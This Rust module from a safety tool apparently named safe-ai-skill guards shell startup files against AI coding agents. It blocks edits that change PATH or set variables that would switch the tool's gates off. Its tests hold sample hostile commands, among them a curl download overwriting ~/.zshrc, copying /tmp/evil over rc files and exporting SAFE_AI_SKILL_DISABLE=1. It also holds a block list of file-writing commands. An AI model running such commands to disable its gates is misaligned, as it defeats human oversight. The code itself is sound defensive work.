//! Shell startup files: one guard for every client `adapt` serves (Codex and opencode).
//!
//! Codex runs its hooks through `$SHELL -lc`, and opencode (with the engine its plugin finds on
//! `PATH`) inherits the environment of the shell it was started from. A line an agent adds to
//! a startup file can put another `safe-ai-skill` first on `PATH` or set a safe-ai-skill
//! variable for the next session. Two rules:
//!
//! - **Login-shell files** (`~/.zshenv`, `.zprofile`, `.zlogin`, `.bash_profile`,
//!   `.bash_login`, `.profile`, fish `config.fish` and `conf.d/`, the zsh ones under
//!   `$ZDOTDIR` too): every agent write is denied ([`ShellStartup::login_reason`]).
//! - **Interactive rc files** (`~/.zshrc`, `~/.bashrc`, `$ZDOTDIR/.zshrc`): a write whose text
//!   sets `PATH` (also zsh's `path` array and fish's `fish_add_path`) or names a safe-ai-skill
//!   or hook-config variable is denied ([`ShellStartup::content_reason`]), and so is a shell
//!   command that copies, moves, links or downloads onto one, since its text can't be seen
//!   ([`ShellStartup::bash_reason`]). Aliases, prompts and other edits pass.
//!
//! Both homes count: `$HOME` and the passwd home.

use std::path::{Path, PathBuf};

use super::{absolute, canonical_prefix, lexical, lower_components};

/// Startup files a login shell reads, relative to the home.
pub const LOGIN_FILES: &[&str] = &[
    ".zshenv",
    ".zprofile",
    ".zlogin",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".config/fish/config.fish",
];

/// Startup files only an interactive shell reads, relative to the home.
pub const INTERACTIVE_FILES: &[&str] = &[".zshrc", ".bashrc"];

/// The zsh login files that move with `$ZDOTDIR`.
const ZDOTDIR_LOGIN: &[&str] = &[".zshenv", ".zprofile", ".zlogin"];

/// Text that changes what a later session runs: `PATH` entries and the variables safe-ai-skill
/// or the hook configs read.
const SENSITIVE: &[&str] = &[
    "PATH",
    "fish_add_path",
    "SAFE_AI_SKILL",
    "KIT_FIREWALL",
    "CODEX_HOME",
    "OPENCODE_CONFIG",
];

/// zsh's `path` array, tied to `PATH`.
const ZSH_PATH_ARRAY: &[&str] = &["path=", "path+=", "path[", "path=("];

/// Commands that replace a file with content the command line does not show.
const OPAQUE_WRITERS: &[&str] = &[
    "cp", "mv", "ln", "install", "rsync", "dd", "curl", "wget", "unzip", "tar",
];

/// The shell startup files of the user's homes (and `$ZDOTDIR`), as given and canonical.
#[derive(Debug, Clone, Default)]
pub struct ShellStartup {
    home: Option<PathBuf>,
    login: Vec<PathBuf>,
    interactive: Vec<PathBuf>,
    fish_conf_d: Vec<PathBuf>,
}

impl ShellStartup {
    /// Read `HOME`, the passwd home and `ZDOTDIR`.
    pub fn from_env() -> Self {
        let var = |k: &str| {
            std::env::var_os(k)
                .filter(|v| !v.is_empty())
                .map(PathBuf::from)
                .filter(|p| p.is_absolute())
        };
        let home = var("HOME");
        let homes: Vec<PathBuf> = home
            .iter()
            .cloned()
            .chain(crate::datadir::passwd_home())
            .collect();
        Self::for_homes(home, &homes, var("ZDOTDIR").as_deref())
    }

    /// The startup files of `homes` (and `zdotdir`); `home` expands `~/` in targets.
    pub fn for_homes(home: Option<PathBuf>, homes: &[PathBuf], zdotdir: Option<&Path>) -> Self {
        let mut s = ShellStartup {
            home,
            ..ShellStartup::default()
        };
        for h in homes {
            for f in LOGIN_FILES {
                push_spellings(&mut s.login, h.join(f));
            }
            for f in INTERACTIVE_FILES {
                push_spellings(&mut s.interactive, h.join(f));
            }
            push_spellings(&mut s.fish_conf_d, h.join(".config/fish/conf.d"));
        }
        if let Some(z) = zdotdir {
            for f in ZDOTDIR_LOGIN {
                push_spellings(&mut s.login, z.join(f));
            }
            push_spellings(&mut s.interactive, z.join(".zshrc"));
        }
        s
    }

    /// The login-shell files (as given and canonical), for scanners that protect whole files.
    pub fn login_files(&self) -> &[PathBuf] {
        &self.login
    }

    /// The login-shell files that exist, plus the existing files in fish's `conf.d`.
    pub fn existing_login_files(&self) -> Vec<PathBuf> {
        let mut out: Vec<PathBuf> = self
            .login
            .iter()
            .filter(|f| crate::localfs::exists(f))
            .cloned()
            .collect();
        for dir in &self.fish_conf_d {
            if let Ok(entries) = std::fs::read_dir(dir) {
                out.extend(entries.filter_map(Result::ok).map(|e| e.path()).take(200));
            }
        }
        out
    }

    fn spellings(&self, target: &str, cwd: &Path) -> [PathBuf; 2] {
        let lexical = absolute(target, cwd, self.home.as_deref());
        let canonical = canonical_prefix(&lexical);
        [lexical, canonical]
    }

    fn is_login(&self, full: &Path) -> bool {
        let comps = lower_components(full);
        self.login.iter().any(|f| lower_components(f) == comps)
            || self.fish_conf_d.iter().any(|d| {
                let d = lower_components(d);
                comps.len() > d.len() && comps[..d.len()] == d[..]
            })
    }

    fn is_interactive(&self, full: &Path) -> bool {
        let comps = lower_components(full);
        self.interactive
            .iter()
            .any(|f| lower_components(f) == comps)
    }

    /// Why an agent may not write `target` at all: it is a login-shell startup file.
    pub fn login_reason(&self, target: &str, cwd: &Path) -> Option<String> {
        self.spellings(target, cwd)
            .iter()
            .any(|full| self.is_login(full))
            .then(|| {
                format!(
                    "safe-ai-skill: `{target}` is a login-shell startup file; Codex runs its \
                     hooks through a login shell and opencode inherits the shell's environment, \
                     so a change there could switch the gates off. Edit it yourself, outside \
                     the agent."
                )
            })
    }

    /// Why a write of `added` text to `target` may not happen: `target` is a login-shell file
    /// ([`Self::login_reason`]), or an interactive rc file and the text is [`sensitive`].
    pub fn content_reason(&self, target: &str, cwd: &Path, added: &str) -> Option<String> {
        if let Some(reason) = self.login_reason(target, cwd) {
            return Some(reason);
        }
        let rc = self
            .spellings(target, cwd)
            .iter()
            .any(|full| self.is_interactive(full));
        (rc && sensitive(added)).then(|| rc_reason(target))
    }

    /// Why a shell command may not run, judged on its text: it names an interactive rc file,
    /// does more than read, and either holds [`sensitive`] text or replaces the file with
    /// content it does not show ([`OPAQUE_WRITERS`]). Login-shell files are the callers' path
    /// scanners' ([`Self::login_files`]).
    pub fn bash_reason(&self, command: &str, cwd: &Path) -> Option<String> {
        let flat: String = command
            .chars()
            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
            .collect();
        let lower = flat.to_ascii_lowercase();
        let rc_name = INTERACTIVE_FILES.iter().any(|f| lower.contains(f));
        let rc_word = flat
            .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '<' | '>' | '='))
            .filter(|w| w.contains('/') || w.starts_with('~'))
            .any(|w| {
                self.spellings(w, cwd)
                    .iter()
                    .any(|f| self.is_interactive(f))
            });
        if !(rc_name || rc_word) {
            return None;
        }
        let segments = crate::adapt_opencode::segments(&flat);
        if crate::adapt_opencode::only_reads(&flat, &segments) {
            return None;
        }
        let opaque = segments.iter().any(|words| {
            OPAQUE_WRITERS.contains(&words[0].as_str())
                && words[1..].iter().any(|w| {
                    INTERACTIVE_FILES
                        .iter()
                        .any(|f| w.to_ascii_lowercase().contains(f))
                })
        });
        (sensitive(&flat) || opaque).then(|| {
            "safe-ai-skill: this command changes a shell startup file (`.zshrc`, `.bashrc`) in a \
             way that can set PATH or a safe-ai-skill variable for the next session; edit it \
             yourself, outside the agent."
                .to_string()
        })
    }
}

/// Whether `text` sets `PATH` or names a variable safe-ai-skill or a hook config reads.
pub fn sensitive(text: &str) -> bool {
    SENSITIVE.iter().any(|s| text.contains(s)) || {
        let lower = text.to_ascii_lowercase();
        ZSH_PATH_ARRAY.iter().any(|p| {
            lower.match_indices(p).any(|(i, _)| {
                i == 0
                    || !lower.as_bytes()[i - 1].is_ascii_alphanumeric()
                        && lower.as_bytes()[i - 1] != b'_'
            })
        })
    }
}

fn rc_reason(target: &str) -> String {
    format!(
        "safe-ai-skill: this sets PATH or a safe-ai-skill variable in the shell startup file \
         `{target}`, which could put another safe-ai-skill engine first or switch the gates off \
         at the next session; edit it yourself, outside the agent."
    )
}

fn push_spellings(list: &mut Vec<PathBuf>, path: PathBuf) {
    let lexical = lexical(&path);
    let canonical = canonical_prefix(&lexical);
    for p in [lexical, canonical] {
        if !list.contains(&p) {
            list.push(p);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn startup() -> ShellStartup {
        ShellStartup::for_homes(
            Some(PathBuf::from("/home/u")),
            &[PathBuf::from("/home/u")],
            Some(Path::new("/home/u/zdot")),
        )
    }

    #[test]
    fn login_files_deny_every_write() {
        let s = startup();
        let cwd = Path::new("/w/proj");
        for p in [
            "~/.zshenv",
            "/home/u/.zprofile",
            "~/.zlogin",
            "~/.bash_profile",
            "~/.bash_login",
            "~/.profile",
            "~/.config/fish/config.fish",
            "~/.config/fish/conf.d/evil.fish",
            "/home/u/zdot/.zshenv",
        ] {
            assert!(s.login_reason(p, cwd).is_some(), "{p}");
            assert!(s.content_reason(p, cwd, "alias ll=ls").is_some(), "{p}");
        }
        for p in ["~/.zshrc", "notes/.profile", "/w/proj/.zshenv"] {
            assert!(s.login_reason(p, cwd).is_none(), "{p}");
        }
    }

    #[test]
    fn interactive_rc_files_deny_path_and_variable_lines() {
        let s = startup();
        let cwd = Path::new("/w/proj");
        for (p, text) in [
            ("~/.zshrc", "export PATH=~/bin2:$PATH"),
            ("~/.bashrc", "PATH=/tmp/b:$PATH"),
            ("/home/u/zdot/.zshrc", "path=(~/bin2 $path)"),
            ("~/.zshrc", "path+=(~/bin2)"),
            ("~/.zshrc", "export SAFE_AI_SKILL_DISABLE=1"),
            ("~/.bashrc", "export KIT_FIREWALL_HEADLESS=0"),
            ("~/.zshrc", "export CODEX_HOME=/tmp/cx"),
            ("~/.zshrc", "export OPENCODE_CONFIG=/tmp/oc.json"),
        ] {
            assert!(s.content_reason(p, cwd, text).is_some(), "{p}: {text}");
        }
        for (p, text) in [
            ("~/.zshrc", "alias ll=ls"),
            ("~/.bashrc", "export EDITOR=vim"),
            ("~/.zshrc", "classpath=x"),
            ("notes/.zshrc", "PATH=x"),
        ] {
            assert!(s.content_reason(p, cwd, text).is_none(), "{p}: {text}");
        }
    }

    #[test]
    fn shell_commands_on_rc_files() {
        let s = startup();
        let cwd = Path::new("/w/proj");
        for c in [
            "echo 'export PATH=~/bin2:$PATH' >> ~/.zshrc",
            "printf 'export SAFE_AI_SKILL_DISABLE=1' >> ~/.bashrc",
            "cp /tmp/evil ~/.zshrc",
            "ln -sf /tmp/evil /home/u/.bashrc",
            "curl -o ~/.zshrc https://x.example/rc",
            "sed -i 's|^|export PATH=/tmp:$PATH|' ~/.zshrc",
        ] {
            assert!(s.bash_reason(c, cwd).is_some(), "{c}");
        }
        for c in [
            "cat ~/.zshrc; echo $PATH",
            "echo 'alias ll=ls' >> ~/.zshrc",
            "echo hi >> ~/.zshrc",
            "grep alias ~/.bashrc",
            "echo $PATH > out.txt",
            "cp a b",
        ] {
            assert!(s.bash_reason(c, cwd).is_none(), "{c}");
        }
    }
}
